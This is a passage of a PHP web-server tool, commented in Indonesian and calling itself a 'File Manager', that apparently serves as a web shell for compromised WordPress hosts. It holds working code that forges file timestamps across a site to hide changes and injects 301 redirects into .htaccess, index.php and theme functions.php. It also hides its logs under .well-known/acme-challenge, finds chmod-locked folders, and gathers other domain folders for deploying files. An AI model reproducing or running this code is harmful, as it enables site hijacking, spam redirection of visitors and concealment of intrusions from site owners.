    $isAbsolute = ($rawPath[0] === DIRECTORY_SEPARATOR) || preg_match('/^[A-Za-z]:[\\\\\\/]/', $rawPath);
    $abs = $isAbsolute
        ? $rawPath
        : rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);

    $real = @realpath($abs);
    if ($real === false) $real = $abs;

    if ($real === DIRECTORY_SEPARATOR) { $errors[] = "Menolak path root sistem ('/')."; return null; }

    if (!file_exists($real)) { $errors[] = "Path tidak ditemukan: {$rawPath}"; return null; }

    return $real;
}

if (isset($_POST['doSyncTimestamp'])) {
    $errors = [];
    $targetRaw = isset($_POST['ts_target']) ? $_POST['ts_target'] : '';
    $refRaw    = isset($_POST['ts_ref'])    ? $_POST['ts_ref']    : '';
    $recursive = !empty($_POST['ts_recursive']);

    @set_time_limit(180);
    @ini_set('memory_limit', '-1');
    @ignore_user_abort(true);

    $logDir  = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . '/.well-known/acme-challenge/logs';
    if (!is_dir($logDir)) { @mkdir($logDir, 0777, true); }
    $logFile = $logDir . '/timestamp_sync.log';
    @ini_set('log_errors', '1');
    @ini_set('error_log', $logFile);

    $target = _resolve_inside_docroot_any($targetRaw, $errors);
    $ref    = _resolve_inside_docroot_any($refRaw,    $errors);

    if (!$errors) {
        clearstatcache(true, $ref);
        $mtime = @filemtime($ref);
        $atime = @fileatime($ref);
        if ($mtime === false) { $errors[] = "Gagal membaca mtime referensi."; }
        if ($atime === false) { $atime = $mtime ?: time(); }
    }

    $filesTouched = 0;
    $dirsTouched  = 0;

    $errList      = [];
    $maxErrInMem  = 200;
    $processed    = 0;
    $maxProcessed = 50000;

    if (!$errors) {
        $doTouch = function($p) use ($mtime, $atime, &$filesTouched, &$dirsTouched, &$errList, $maxErrInMem) {
            if (!@is_writable($p)) {
                if (count($errList) < $maxErrInMem) $errList[] = "Not writable: {$p}";
                @error_log("timestamp-sync: not writable -> {$p}");
                return;
            }
            if (@touch($p, $mtime, $atime)) {
                if (is_dir($p)) $dirsTouched++; else $filesTouched++;
            } else {
                if (count($errList) < $maxErrInMem) $errList[] = "Gagal touch: {$p}";
                @error_log("timestamp-sync: touch failed -> {$p}");
            }
        };

        if (is_dir($target) && $recursive) {
            $skip = ['node_modules','vendor','.git','cache','tmp','logs','wp-content/uploads'];

            $it = new \RecursiveIteratorIterator(
                new \RecursiveCallbackFilterIterator(
                    new \RecursiveDirectoryIterator($target, \FilesystemIterator::SKIP_DOTS),
                    function (\SplFileInfo $info) use ($skip) {
                        $name = $info->getFilename();
                        if ($info->isDir()) {
                            foreach ($skip as $s) {
                                if (strcasecmp($name, $s) === 0) return false;
                            }
                        }
                        return !$info->isLink();
                    }
                ),
                \RecursiveIteratorIterator::SELF_FIRST
            );

            $dirs = [];
            foreach ($it as $path => $info) {
                if (++$processed > $maxProcessed) { 
                    @error_log("timestamp-sync: processed limit {$processed} reached, stopping early.");
                    break; 
                }
                if ($info->isDir()) {
                    $dirs[] = $path;
                    continue;
                }
                $doTouch($path);
            }
            usort($dirs, function($a, $b) {
                $la = strlen($a);
                $lb = strlen($b);
                if ($la == $lb) return 0;
                return ($la < $lb) ? 1 : -1;
            });
            foreach ($dirs as $d) {
                if (++$processed > $maxProcessed) break;
                $doTouch($d);
            }
        } else {
            $doTouch($target);
        }
    }

    if ($errors) {
        $_SESSION['ts_status']  = 'error';
        $_SESSION['ts_message'] = 'Gagal: ' . htmlspecialchars(implode(' | ', $errors));
    } else {
        $msg = "SUKSES samakan timestamp.\n".
               "Target: {$target}\n".
               "Referensi: {$ref}\n".
               "Diset ke: mtime=" . date('c', (int)$mtime) . " | atime=" . date('c', (int)$atime) . "\n".
               "Tersentuh: {$filesTouched} file, {$dirsTouched} direktori";
        if ($processed > $maxProcessed) {
            $msg .= "\nCatatan: pemrosesan dibatasi pada {$maxProcessed} entri untuk mencegah timeout.";
        }
        if (!empty($errList)) {
            $slice = array_slice($errList, 0, 10);
            $msg .= "\nPERINGATAN (" . count($errList) . " ditampilkan maks 10): " . implode(' | ', array_map('htmlspecialchars', $slice));
        }
        $_SESSION['ts_status']  = empty($errList) ? 'success' : 'partial';
        $_SESSION['ts_message'] = nl2br($msg);
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

function getNiceSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    if ($bytes == 0) return '0 B';
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2).' '.$sizes[$i];
}

// === HELPER: PARSE INPUT URL/PATH UNTUK REDIRECT 301 ===
function fm_parse_redirect_source($raw, &$isHome, &$path) {
    $raw = trim((string)$raw);

    $isHome = false;
    $path   = '/';

    if ($raw === '') {
        $isHome = true;
        $path   = '/';
        return;
    }

    $clean = preg_replace('#^https?://[^/]+#i', '', $raw);
    $clean = trim($clean);

    if ($clean === '' || $clean === '/' || strtolower($clean) === 'homepage') {
        $isHome = true;
        $path   = '/';
        return;
    }

    if ($clean[0] !== '/') $clean = '/'.$clean;

    $onlyPath = parse_url($clean, PHP_URL_PATH);
    if (!$onlyPath) $onlyPath = $clean;

    $isHome = ($onlyPath === '/' || $onlyPath === '/index.php');
    $path   = $onlyPath;
}

/// === HANDLER: BUAT REDIRECT 301 ===
if (isset($_POST['runRedirect301'])) {
    $targetType  = isset($_POST['redirect_target_type']) ? $_POST['redirect_target_type'] : '';
    $sourceRaw   = isset($_POST['redirect_source']) ? $_POST['redirect_source'] : '';
    $userTarget  = isset($_POST['redirect_target_url']) ? trim($_POST['redirect_target_url']) : '';
    $redirectTo  = $userTarget !== '' ? $userTarget : $redirectTargetDefault;
    $errors      = [];
    $targetLabel = '';

    $sourceRaw = trim((string)$sourceRaw);
    if ($sourceRaw === '') {
        $errors[] = 'URL/path yang akan di-redirect wajib diisi.';
    }

    if ($redirectTo === '') {
        $errors[] = 'URL tujuan redirect wajib diisi.';
    } elseif (!filter_var($redirectTo, FILTER_VALIDATE_URL)) {
        $errors[] = 'URL tujuan redirect tidak valid.';
    }

    $isHome = false;
    $path   = '/';
    if (!$errors) {
        fm_parse_redirect_source($sourceRaw, $isHome, $path);
    }

    if (!$errors) {
         if ($targetType === 'htaccess') {
            $targetLabel = '.htaccess (Document Root)';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $ht      = $docRoot . DIRECTORY_SEPARATOR . '.htaccess';

            $existing = '';
            if (file_exists($ht)) {
                $existing = @file_get_contents($ht);
                if ($existing === false) {
                    $errors[] = 'Gagal membaca .htaccess.';
                }
            }

            if (!$errors) {
                $hasRewriteEngine = stripos($existing, 'RewriteEngine On') !== false;

                $snippet = '';

                if (!$hasRewriteEngine) {
                    $snippet .= "RewriteEngine On\n\n";
                }

                if ($isHome) {
                    $snippet .= "RewriteRule ^$ {$redirectTo} [R=301,L]\n";
                } else {
                    $pattern = trim($path, '/');
                    $pattern = preg_quote($pattern, '#');
                    $snippet .= "RewriteRule ^{$pattern}/?$ {$redirectTo} [R=301,L]\n";
                }

                $posBegin = stripos($existing, '# BEGIN WordPress');

                if ($posBegin !== false) {
                    $before     = substr($existing, 0, $posBegin);
                    $after      = substr($existing, $posBegin);
                    $newContent = rtrim($before, "\r\n")
                                . "\n\n"
                                . $snippet
                                . "\n"
                                . ltrim($after, "\r\n");
                } else {
                    $newContent = rtrim($existing, "\r\n") . "\n\n" . $snippet;
                }

                if (@file_put_contents($ht, $newContent) === false) {
                    $errors[] = 'Gagal menulis .htaccess.';
                }
            }

        } elseif ($targetType === 'index') {
            $targetLabel = 'index.php (Document Root)';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $file    = $docRoot . DIRECTORY_SEPARATOR . 'index.php';

            if (!file_exists($file)) {
                $errors[] = 'index.php tidak ditemukan di Document Root.';
            } else {
                $src = @file_get_contents($file);
                if ($src === false) {
                    $errors[] = 'Gagal membaca index.php.';
                } else {
                    if (strpos($src, '// 301 redirect (File Manager)') !== false) {
                        $errors[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke index.php.';
                    } else {
                        $snippet  = "\n// 301 redirect (File Manager)\n";
                        $snippet .= "if (php_sapi_name() !== 'cli') {\n";
                        $snippet .= "    \$reqUri = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                        $snippet .= "    \$path = parse_url(\$reqUri, PHP_URL_PATH);\n";
                        $snippet .= "    if (!\$path) { \$path = '/'; }\n";

                        if ($isHome) {
                            $snippet .= "    if (\$path === '/' || \$path === '/index.php') {\n";
                        } else {
                            $p1 = $path;
                            $p2 = rtrim($path, '/');
                            if ($p2 === '') $p2 = '/';
                            $snippet .= "    if (\$path === '".addslashes($p1)."' || \$path === '".addslashes($p2)."') {\n";
                        }

                        $snippet .= "        header('Location: {$redirectTo}', true, 301);\n";
                        $snippet .= "        exit;\n";
                        $snippet .= "    }\n";
                        $snippet .= "}\n";

                        $pos = strpos($src, '<?php');
                        if ($pos === false) {
                            $new = "<?php\n{$snippet}\n?>\n" . $src;
                        } else {
                            $posEnd = $pos + 5;
                            $new    = substr($src, 0, $posEnd) . "\n{$snippet}\n" . substr($src, $posEnd);
                        }

                        if (@file_put_contents($file, $new) === false) {
                            $errors[] = 'Gagal menulis index.php.';
                        }
                    }
                }
            }

        } elseif ($targetType === 'theme') {
            $targetLabel = 'functions.php Theme Aktif';

            $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
            $wpLoad  = $docRoot . DIRECTORY_SEPARATOR . 'wp-load.php';

            if (!file_exists($wpLoad)) {
                $errors[] = 'wp-load.php tidak ditemukan. Tidak bisa otomatis mendeteksi theme.';
            } else {
                require_once $wpLoad;

                if (!function_exists('get_stylesheet_directory')) {
                    $errors[] = 'Fungsi get_stylesheet_directory() tidak tersedia.';
                } else {
                    $themeDir  = rtrim(get_stylesheet_directory(), DIRECTORY_SEPARATOR);
                    $funcFile  = $themeDir . DIRECTORY_SEPARATOR . 'functions.php';

                    if (!file_exists($funcFile)) {
                        $errors[] = 'functions.php theme aktif tidak ditemukan.';
                    } else {
                        $src = @file_get_contents($funcFile);
                        if ($src === false) {
                            $errors[] = 'Gagal membaca functions.php theme.';
                        } else {
                            if (strpos($src, '// 301 redirect (File Manager)') !== false) {
                                $errors[] = 'Redirect 301 dari File Manager sudah pernah ditambahkan ke functions.php.';
                            } else {
                                $snippet  = "\n\n// 301 redirect (File Manager)\n";
                                $snippet .= "add_action('template_redirect', function () {\n";
                                $snippet .= "    \$reqUri = isset(\$_SERVER['REQUEST_URI']) ? \$_SERVER['REQUEST_URI'] : '/';\n";
                                $snippet .= "    \$path = parse_url(\$reqUri, PHP_URL_PATH);\n";
                                $snippet .= "    if (!\$path) { \$path = '/'; }\n";

                                if ($isHome) {
                                    $snippet .= "    if (\$path === '/' || \$path === '/index.php') {\n";
                                } else {
                                    $p1 = $path;
                                    $p2 = rtrim($path, '/');
                                    if ($p2 === '') $p2 = '/';
                                    $snippet .= "    if (\$path === '".addslashes($p1)."' || \$path === '".addslashes($p2)."') {\n";
                                }

                                $snippet .= "        wp_redirect('{$redirectTo}', 301);\n";
                                $snippet .= "        exit;\n";
                                $snippet .= "    }\n";
                                $snippet .= "});\n";

                                $new = $src . $snippet;

                                if (@file_put_contents($funcFile, $new) === false) {
                                    $errors[] = 'Gagal menulis functions.php theme.';
                                }
                            }
                        }
                    }
                }
            }

        } else {
            $errors[] = 'Target file tidak valid. Pilih htaccess / index / theme.';
        }
    }

    if ($errors) {
        $_SESSION['redirect_status']  = 'error';
        $_SESSION['redirect_message'] = 'Gagal membuat redirect: ' . implode(' | ', $errors);
    } else {
        $_SESSION['redirect_status']  = 'success';
        $_SESSION['redirect_message'] = 'Redirect 301 ditambahkan untuk "' .
            htmlspecialchars($sourceRaw, ENT_QUOTES) .
            '" → ' . htmlspecialchars($redirectTo, ENT_QUOTES) .
            ' di ' . $targetLabel . '.';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === FITUR SCAN .htaccess & Folder CHMOD LOCKED ===
if (isset($_GET['downloadScan']) && !empty($_SESSION['scan_result_file'])) {
    $f = $_SESSION['scan_result_file'];
    if (file_exists($f)) {
        header('Content-Type: text/html; charset=UTF-8');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        @unlink($f);
        unset($_SESSION['scan_result_file']);
        exit;
    } else {
        unset($_SESSION['scan_result_file']);
    }
}

if (
    isset($_POST['scanHtaccess']) ||
    isset($_POST['scanLocked'])   ||
    isset($_POST['scanWpAdmin'])  ||
    isset($_POST['scanWpIncludes'])
) {
    $scanRoot    = $rootDirectory;
    $scanHtaccess= isset($_POST['scanHtaccess']);
    $scanLocked  = isset($_POST['scanLocked']);
    $scanWpAdmin = isset($_POST['scanWpAdmin']);
    $scanWpIncl  = isset($_POST['scanWpIncludes']);

    $versionAdmin = isset($_POST['wpVersionAdmin']) ? trim($_POST['wpVersionAdmin']) : '';
    $versionIncl  = isset($_POST['wpVersionIncludes']) ? trim($_POST['wpVersionIncludes']) : '';

    $lockedModes = [
        '000','001','002','003','004','005','006','007',
        '010','011','012','013','014','015','016','017',
        '111','222','311','400','401','402','403','404',
        '405','406','407','444','555'
    ];

    $sections = [];

    if ($scanHtaccess || $scanLocked) {
        $foundHtaccess = [];
        $foundLocked   = [];

        $scanFn = function($dir) use (&$scanFn, $scanHtaccess, $scanLocked, $lockedModes, $scanRoot, &$foundHtaccess, &$foundLocked) {
            try { $iterator = new DirectoryIterator($dir); } catch (Exception $e) { return; }
            foreach ($iterator as $item) {
                if ($item->isDot()) continue;
                $path = $item->getPathname();
                $rel  = substr($path, strlen($scanRoot));
                if ($scanHtaccess && $item->isFile() && strtolower($item->getFilename()) === '.htaccess') {
                    $foundHtaccess[] = $rel === '' ? '/' : $rel;
                }
                if ($item->isDir()) {
                    if ($scanLocked) {
                        $perm = substr(sprintf('%o', @fileperms($path)), -3);
                        if (in_array($perm, $lockedModes, true)) {
                            $foundLocked[] = ['path' => $rel === '' ? '/' : $rel, 'perm' => $perm];
                        }
                    }
                    $scanFn($path);
                }
            }
        };

        $scanFn($scanRoot);
        $sections[] = format_htaccess_locked_html($scanRoot, $foundHtaccess, $foundLocked);
    }

    if ($scanWpAdmin) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-admin', $versionAdmin ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-ADMIN</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    if ($scanWpIncl) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-includes', $versionIncl ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-INCLUDES</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    $scanResultDir = $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/result/';
    if (!is_dir($scanResultDir)) { @mkdir($scanResultDir, 0777, true); }

    $scanFile = $scanResultDir . "scan_result_" . date("Ymd_His") . "_" . rand(111,999) . ".html";

    $now = date('Y-m-d H:i:s');
    $html = <<<HTML
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Laporan Scan File Manager - {$now}</title>
<style>
  :root{
    --bg:#0f1320; --panel:#101426; --ink:#e7eefb; --muted:#b9c4d6;
    --green:#19c37d; --yellow:#ffb400; --red:#ef4444; --line:#223;
  }
  body{margin:0;padding:24px;background:linear-gradient(180deg,var(--bg),#0b0e16);color:var(--ink);font:14px/1.45 system-ui,Segoe UI,Roboto,Arial}
  h1{margin:0 0 16px;font-size:20px}
  h2{margin:0 0 12px;font-size:18px}
  h3{margin:16px 0 8px;font-size:15px;color:var(--muted)}
  .container{max-width:1080px;margin:0 auto}
  .header{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin-bottom:16px}
  .report-section{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
  .section-desc{color:var(--muted);margin-top:-4px;margin-bottom:10px}
  .grid-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin:10px 0 4px}
  .card{background:#0c1120;border:1px solid var(--line);border-radius:10px;padding:10px 12px}
  .stat .k{font-size:12px;color:var(--muted)}
  .stat .v{font-size:18px;font-weight:700}
  .stat.ok .v{color:var(--green)}
  .stat.warn .v{color:var(--yellow)}
  .stat.info .v{color:#7aa2ff}
  .tbl{width:100%;border-collapse:separate;border-spacing:0;margin:8px 0 4px;border:1px solid var(--line);border-radius:10px;overflow:hidden}
  .tbl thead th{background:#0a0f1d;color:#aab8d6;text-align:left;font-weight:600;font-size:12px;padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody td{padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody tr:nth-child(odd){background:#0b1020}
  .tbl code{color:#cfe4ff}
  .empty{color:var(--muted);background:#0b1020;border:1px dashed var(--line);padding:10px;border-radius:8px}
  .empty.error{color:#ffd1d1;border-color:#412; background:#1b0e10}
  .sep{border:0;border-top:1px solid var(--line);margin:14px 0}
  .badge{display:inline-block;padding:2px 6px;border-radius:999px;font-size:12px;border:1px solid var(--line)}
  .badge-warn{background:#241c00;color:#ffd36e;border-color:#5a4300}
  footer{color:var(--muted);margin-top:14px;text-align:center;font-size:12px}
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Laporan Scan File Manager</h1>
      <div>Dibuat: {$now}</div>
    </div>

    <!-- SECTIONS -->
    {{SECTIONS}}

    <footer>Generated by File Manager</footer>
  </div>
</body>
</html>
HTML;

    $html = str_replace('{{SECTIONS}}', implode("\n\n", $sections), $html);
    file_put_contents($scanFile, $html);
    $_SESSION['scan_result_file'] = $scanFile;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CORE SCAN HELPERS (WordPress checksums) ===
function http_get_json_assoc($url, $timeout = 12) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_USERAGENT => 'fm-core-scan/1.0 (+checksum)',
        ]);
        $res = curl_exec($ch);
        if ($res === false) {
            $err = curl_error($ch);
            curl_close($ch);
            throw new RuntimeException("HTTP (cURL) gagal: $err");
        }
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code < 200 || $code >= 300) throw new RuntimeException("HTTP $code");
        $data = json_decode($res, true);
        if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
        return $data;
    }
    $ctx = stream_context_create([
        'http' => ['timeout' => $timeout, 'header' => "User-Agent: fm-core-scan/1.0\r\n"]
    ]);
    $res = @file_get_contents($url, false, $ctx);
    if ($res === false) throw new RuntimeException("HTTP gagal (file_get_contents).");
    $data = json_decode($res, true);
    if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
    return $data;
}

function wp_detect_version_locale_from_root($root) {
    @include_once rtrim($root, '/').'/wp-load.php';

    $version = null;
    if (isset($GLOBALS['wp_version']) && is_string($GLOBALS['wp_version'])) {
        $version = $GLOBALS['wp_version'];
    } else {
        $vf = rtrim($root, '/').'/wp-includes/version.php';
        if (is_file($vf)) {
            $src = @file_get_contents($vf);
            if ($src !== false && preg_match("/\\$wp_version\\s*=\\s*'([^']+)'/m", $src, $m)) {
                $version = $m[1];
            }
        }
    }

    $locale = null;
    if (function_exists('get_locale')) $locale = @get_locale();
    if (!$locale) {
        $wpc = rtrim($root, '/').'/wp-config.php';
        if (is_file($wpc)) {
            $src = @file_get_contents($wpc);
            if ($src !== false && preg_match('/define\\(\\s*[\'"]WPLANG[\'"]\\s*,\\s*[\'"]([^\'"]+)[\'"]\\s*\\)/', $src, $m)) {
                $locale = $m[1];
            }
        }
    }
    if (!$locale) $locale = 'en_US';

    return [$version, $locale];
}

function wp_fetch_checksums($version, $locale) {
    $api = "https://api.wordpress.org/core/checksums/1.0/?version=" . rawurlencode($version) .
           "&locale=" . rawurlencode($locale);
    $data = http_get_json_assoc($api);
    if (!isset($data['checksums']) || !is_array($data['checksums'])) {
        throw new RuntimeException('Format checksums dari API tidak valid.');
    }
    return $data['checksums'];
}

function scan_core_subdir($root, $subdir, $versionOpt = null, $localeOpt = null) {
    $root = rtrim($root, DIRECTORY_SEPARATOR);
    $target = $root . DIRECTORY_SEPARATOR . $subdir;

    if (!is_dir($target)) {
        throw new RuntimeException("Folder target tidak ditemukan: {$subdir}");
    }

    list($detectedVersion, $detectedLocale) = wp_detect_version_locale_from_root($root);
    $version = $versionOpt ?: $detectedVersion;
    $locale  = $localeOpt  ?: $detectedLocale;
    if (!$version) throw new RuntimeException("Tidak bisa deteksi versi WordPress. Isi versi manual.");

    $checksums = wp_fetch_checksums($version, $locale);

    $core_map = [];
    foreach ($checksums as $rel => $md5) {
        $rel_norm = str_replace('\\', '/', $rel);
        if (strpos($rel_norm, $subdir . '/') === 0) {
            $core_map[$rel_norm] = strtolower($md5);
        }
    }

    $unknown = [];
    $modified = [];
    $okcount = 0;
    $unreadableDirs = [];
    $unreadableFiles = [];

    $flags = FilesystemIterator::SKIP_DOTS;
    $rdi = new RecursiveDirectoryIterator($target, $flags);
    $rii = new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);

    foreach ($rii as $fileInfo) {
        /** @var SplFileInfo $fileInfo */
        $abs = $fileInfo->getPathname();

        if ($fileInfo->isDir()) {
            if (!@is_readable($abs)) {
                $relDir = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
                $relDir = str_replace(DIRECTORY_SEPARATOR, '/', $relDir);
                $unreadableDirs[$relDir] = true;
            }
            continue;
        }
        if (!$fileInfo->isFile()) continue;

        if (!@is_readable($abs)) {
            $relF = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
            $relF = str_replace(DIRECTORY_SEPARATOR, '/', $relF);
            $unreadableFiles[$relF] = true;
            continue;
        }

        $rel = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
        $rel = str_replace(DIRECTORY_SEPARATOR, '/', $rel);

        if (!isset($core_map[$rel])) {
            $unknown[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => @md5_file($abs) ?: '',
            ];
            continue;
        }

        $md5 = @md5_file($abs);
        if (!$md5 || strtolower($md5) !== $core_map[$rel]) {
            $modified[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => $md5 ?: '',
                'expected' => $core_map[$rel],
            ];
        } else {
            $okcount++;
        }
    }

    $byPath = function($a, $b) { return strcmp($a['path'], $b['path']); };
    usort($unknown, $byPath);
    usort($modified, $byPath);
    ksort($unreadableDirs);
    ksort($unreadableFiles);

    return [
        'version' => $version,
        'locale'  => $locale,
        'subdir'  => $subdir,
        'okcount' => $okcount,
        'unknown' => $unknown,
        'modified'=> $modified,
        'unreadableDirs'  => array_keys($unreadableDirs),
        'unreadableFiles' => array_keys($unreadableFiles),
    ];
}

function format_htaccess_locked_html($root, array $htaccessList, array $lockedList) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Scan: .htaccess &amp; Folder Locked</h2>
      <div class="section-desc">Root: <code><?= htmlspecialchars($root) ?></code></div>

      <?php if (count($htaccessList)): ?>
        <h3>.htaccess ditemukan (<?= (int)count($htaccessList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Lokasi</th></tr></thead>
          <tbody>
          <?php foreach ($htaccessList as $i => $p): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($p) ?></code></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file <code>.htaccess</code> yang terdeteksi.</div>
      <?php endif; ?>

      <hr class="sep">

      <?php if (count($lockedList)): ?>
        <h3>Folder terkunci CHMOD (<?= (int)count($lockedList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Folder</th><th>Permission</th></tr></thead>
          <tbody>
          <?php foreach ($lockedList as $i => $row): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($row['path']) ?></code></td>
              <td><span class="badge badge-warn"><?= htmlspecialchars($row['perm']) ?></span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada folder yang terdeteksi dalam kondisi terkunci.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

function format_core_scan_html_report(array $scan) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Core Scan: <?= htmlspecialchars(strtoupper($scan['subdir'])) ?></h2>
      <div class="grid-cards">
        <div class="card stat"><div class="k">WP Version</div><div class="v"><?= htmlspecialchars($scan['version']) ?></div></div>
        <div class="card stat"><div class="k">Locale</div><div class="v"><?= htmlspecialchars($scan['locale']) ?></div></div>
        <div class="card stat ok"><div class="k">Cocok checksum</div><div class="v"><?= (int)$scan['okcount'] ?></div></div>
        <div class="card stat warn"><div class="k">Core berubah</div><div class="v"><?= (int)count($scan['modified']) ?></div></div>
        <div class="card stat info"><div class="k">Non-core</div><div class="v"><?= (int)count($scan['unknown']) ?></div></div>
      </div>

      <?php if (!empty($scan['unreadableDirs'])): ?>
        <h3>Folder tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableDirs'] as $d): ?>
            <li><code><?= htmlspecialchars($d) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <?php if (!empty($scan['unreadableFiles'])): ?>
        <h3>File tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableFiles'] as $f): ?>
            <li><code><?= htmlspecialchars($f) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <hr class="sep">

      <h3>Non-core (bukan bagian dari core resmi)</h3>
      <?php if (!empty($scan['unknown'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead>
          <tbody>
          <?php foreach ($scan['unknown'] as $i => $u): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($u['path']) ?></code></td>
              <td><?= number_format((int)$u['size']) ?> B</td>
              <td><?= $u['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$u['mtime'])) : '—' ?></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file non-core.</div>
      <?php endif; ?>

      <hr class="sep">

      <h3>Core berubah (checksum mismatch)</h3>
      <?php if (!empty($scan['modified'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th><th>Keterangan</th></tr></thead>
          <tbody>
          <?php foreach ($scan['modified'] as $i => $m): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($m['path']) ?></code></td>
              <td><?= number_format((int)$m['size']) ?> B</td>
              <td><?= $m['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$m['mtime'])) : '—' ?></td>
              <td><span class="badge badge-warn">Berbeda dari core resmi</span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file core yang berubah.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

// ==================== DEPLOY FILE KE SUBDOMAIN ====================
// Fungsi scan folder domain/subdomain (dengan pengecualian folder sistem)
function fm_collect_domain_targets(&$list, &$errors) {
    $list = [];
    $errors = [];

    $docRoot = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$docRoot) $docRoot = $_SERVER['DOCUMENT_ROOT'];
    $docRoot = rtrim($docRoot, DIRECTORY_SEPARATOR);

    $roots = [];

    // 1) Di dalam public_html (Document Root)
    if ($docRoot && is_dir($docRoot)) {
        $roots[] = $docRoot;
    }

    $parent     = dirname($docRoot);
    $parentReal = $parent ? (@realpath($parent) ?: $parent) : null;

    if ($parentReal && $parentReal !== $docRoot && is_dir($parentReal)) {
        $roots[] = $parentReal;
    }

    // Pola DirectAdmin: .../domains/domain.com/public_html
    $pattern = DIRECTORY_SEPARATOR . 'domains' . DIRECTORY_SEPARATOR;
    $pos = strpos($docRoot, $pattern);
    if ($pos !== false) {
        $domainsRoot = substr($docRoot, 0, $pos + strlen($pattern));
        $domainsRoot = rtrim($domainsRoot, DIRECTORY_SEPARATOR);
        if ($domainsRoot && is_dir($domainsRoot)) {
            $roots[] = $domainsRoot;
        }
    }

    $roots = array_values(array_unique($roots));

    $maxDepth = 3;
    $maxFound = 200;
    $skipNames = [
        '.', '..',
        '.git', '.svn',
        'node_modules', 'vendor',
        'logs', 'log',
        'tmp', 'cache',
        'wp-content', 'wp-admin', 'wp-includes'
    ];

    // Folder-folder sistem yang TIDAK mau kita scan (cPanel dll)
    $excludeHome = [
        'etc','logs','mail','tmp','ssl','access-logs','public_ftp','backup','backups',
